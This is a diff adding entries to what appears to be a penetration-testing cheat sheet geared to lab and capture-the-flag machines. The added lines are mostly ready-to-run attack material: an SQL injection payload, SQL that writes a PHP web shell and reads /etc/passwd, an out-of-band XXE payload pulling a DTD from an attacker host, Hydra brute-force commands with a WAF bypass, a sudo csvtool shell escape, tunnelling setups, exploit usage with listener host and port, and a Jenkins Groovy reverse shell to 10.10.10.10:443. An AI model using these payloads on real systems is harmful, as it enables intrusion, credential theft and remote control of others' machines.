@@ -62,6 +62,9 @@ $ nslookup 10.10.10.10
 	* server 10.10.10.10
 	* 10.10.10.10
 	
+=> Dig
+$ dig bank.local axfr @10.10.10.10
+
 => Host
 $ host -t ns megacorpone.com
 ```
@@ -452,6 +455,13 @@ $ https://www.commandlinefu.com/commands/view/15313/check-open-ports-without-net
 $ for i in {1..65535};do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\n[+] Open Port at\n: \t%d\n" "$i" || printf "."; done
 ```
 
+### Curl Commands
+
+```bash
+# Commands
+$ curl -XGET -G -b 'PHPSESSID=cnc4ofdvpm1770nodu7lcbte46' 'http://localhost/tracks.php' --data-urlencode "id=9999 union select 1,database(),3-- -"
+```
+
 ### SQL Injection
 
 ```bash
@@ -505,6 +515,10 @@ $ ' and password like 'k%'--
 => Write File
 $ Set Global General_Log_File = '/tmp/test.php';
 $ Select '<?php system($_GET[]); ?>';
+$ select '<?php system($_GET["cmd"]); ?>' into outfile 'C:/xampp/htdocs/shell4.php' 
+
+=> Read File
+$ load_file("/etc/passwd");
 
 [ORACLE]
 => Get Current Database
@@ -596,7 +610,7 @@ $ UPDATE user SET passwd = "" where id 2;
 ### XXE Injection
 
 ```
-=> Payload
+=> Payload (1)
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
 <report>
@@ -604,6 +618,21 @@ $ UPDATE user SET passwd = "" where id 2;
 	<writer>John</writer>
 </report>
 
+=> Payload (2)
+# send this on the application
+<?xml version="1.0" ?>
+<!DOCTYPE message [
+    <!ENTITY % ext SYSTEM "http://10.10.10.10/poc.dtd">
+    %ext;
+]>
+<message></message>
+
+# content of poc.dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+				
 => References
 $ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
 ```
@@ -626,6 +655,9 @@ https://apis.guru/graphql-voyager/
 ### Hydra
 
 ```bash
+=> Export Proxy
+export HYDRA_PROXY=connect://127.0.0.1:8080
+
 => Install
 sudo apt-get install hydra-gtk
 
@@ -636,6 +668,9 @@ hydra -L user.txt -P pass.txt 10.10.10.10 ssh -s 2222 -t 30 -f
 
 => Json
 hydra -l admin -P rockyou.txt localhost http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -V -f
+
+=> Json (Bypass WAF - User agent Hydra)
+hydra -l admin -P rockyou.txt localhost http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^"}:H=User-Agent\: Mozilla/5.0:H=Content-Type\: application/json:F=Wrong credentials' -V -f
 
 => POST
 hydra -l admin -P rockyou.txt 10.10.10.10 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
@@ -687,6 +722,9 @@ ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -e .php,.html,.txt,.bak -t 
 ffuf -u 'https://FUZZ.bank.local' -w subdomains-top1million-20000.txt:FUZZ -t 30
 ffuf -u 'http://10.10.10.10/' -w sqli.txt:FUZZ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=FUZZ" -fc 200
 ffuf -u 'https://10.10.10.10/FUZZ' -w common.txt:FUZZ -e .txt -t 1 -fs 1508 -fl 4
+
+# Subomdina/Vhost
+ffuf -ic -c -u "http://bank.local/" -H "Host: FUZZ.bank.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -fc 301
 
 # POST Method
 ffuf -u 'http://10.10.10.10/main/wp-login.php' -w user.txt:USER -w pass.txt:PASS -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=USER&pwd=PASS&wp-submit=Log+In"
@@ -1504,6 +1542,12 @@ https://www.onsecurity.io/blog/file-upload-checklist/
 https://book.hacktricks.xyz/pentesting-web/file-upload
 ```
 
+### Static Binaries (Linux)
+
+```bash
+
+```
+
 ### PowerShell Commands
 
 ```powershell
@@ -1823,6 +1867,29 @@ $ script -qc /bin/bash /dev/null
 $ python -m 'import pty;pty.spawn("/bin/bash"))'
 $ python3 -m 'import pty;pty.spawn("/bin/bash"))'
 $ Ctrl + z @ stty -raw echo;fg
+```
+
+### Port Forwarding & Tunneling
+
+```bash
+# Socat
+socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
+socat tcp-listen:8080,reuseaddr,fork tcp:localhost:8080
+
+# Meterpreter
+portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
+
+# Chisel
+## Client Machine
+./chisel client 10.66.67.154:8000 R:25:127.0.0.1:25
+./chisel client 10.66.67.130:8000 R:8080:127.0.0.1:8080
+./chisel client 10.10.10.10:8001 R:1080:socks
+
+## Attacker Machine
+./chisel server -p 8000 --reverse
+
+# References
+-> https://book.hacktricks.xyz/tunneling-and-port-forwarding
 ```
 
 ### Crackmapexec
@@ -3264,6 +3331,13 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
+### Csvtools
+
+```bash
+# Commands
+sudo csvtool call '/bin/sh;false' /etc/passwd -t --help
+```
+
 # D. Exploit/CVE/Abuse/Misconf
 
 ### Sudo - Security Bypass
@@ -3292,6 +3366,17 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo YmFzaCAtaSA+JiAvZ
 https://github.com/opsxcq/exploit-CVE-2014-6271
 ```
 
+### CVE-2021-41773 & CVE-2021-42013
+
+```bash
+# Affected Version
+-> Apache 2.4.49 
+-> Apache 2.4.50
+
+# References
+-> https://github.com/iilegacyyii/PoC-CVE-2021-41773
+-> https://www.exploit-db.com/exploits/50406
+```
 
 ### MS-17-010
 
@@ -3612,26 +3697,35 @@ https://hackmyvm.eu/machines/machine.php?vm=Texte
 
 ```bash
 # Downloads
-https://raw.githubusercontent.com/VineshChauhan24/LFI-phpinfo-RCE/master/exploit.py
+https://raw.githubusercontent.com/roughiz/lfito_rce/master/lfito_rce.py
+
+# Commands
+-> python lfito_rce.py -l "http://10.10.10.10/test.php?page=" --lhost 10.10.10.9 --lport 9001 -i "http://10.10.10.105/info.php" -t 100 -a 1 --payload 2 --verbose true
 
 # References
-
+-> https://rafalharazinski.gitbook.io/security/other-web-vulnerabilities/local-remote-file-inclusion/phpinfo-log-race-condition
+=> https://raw.githubusercontent.com/VineshChauhan24/LFI-phpinfo-RCE/master/exploit.py
 ```
 
 ### DirtyCow
 
 ```bash
 # Download
+https://github.com/exrienz/DirtyCow
 
 # Usage
 gcc -pthread dirty.c -o dirty -lcrypt
 ./dirty password
 ```
 
-### Ubuntu
+### Linux Kernel Exploit
 
 ```bash
 # Kernel 
+
+# <= 2.6.36-rc8
+- https://www.exploit-db.com/exploits/15285
+
 # < 2.6.37 
 - https://www.exploit-db.com/exploits/15704 
 
@@ -3650,6 +3744,9 @@ gcc -pthread dirty.c -o dirty -lcrypt
 
 # < 5.11
 - https://github.com/briskets/CVE-2021-3493
+
+# References
+-> https://github.com/evait-security/ClickNRoot (Kernel Exploit)
 ```
 
 ### SambaCry RCE: CVE-2017–7494
@@ -3936,6 +4033,7 @@ https://nepcodex.com/2021/10/tranquil-writeup-hackmyvm-walkthrough/
 # Wpscan
 wpscan --url https://10.10.10.10/blog/ -e u,vp --disable-tls-checks
 wpscan --url http://10.10.10.10/blog/ -e u --passwords rockyou.txt
+wpscan --url http://10.10.10.10/ --usernames kwheel,bjoel --passwords rockyou.txt
 
 # Location
 /wp-content/plugins/
@@ -4186,6 +4284,14 @@ perl exploit.pl 10.10.10.10 10000 /etc/passwd 0
 ### Jenkins
 
 ```bash
+# Bruteforce hydra
+hydra -l admin -P rockyou.txt 10.10.10.10 -s 30609 http-post-form 
+"/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
+
+# Reverse shell (Linux)
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
 
 ```
 
@@ -4313,3 +4419,4 @@ Response.write(o)
 - https://zer1t0.gitlab.io/posts/attacking_ad/
 - https://pentestbook.six2dez.com/
 - https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
+- https://github.com/vulhub/vulhub
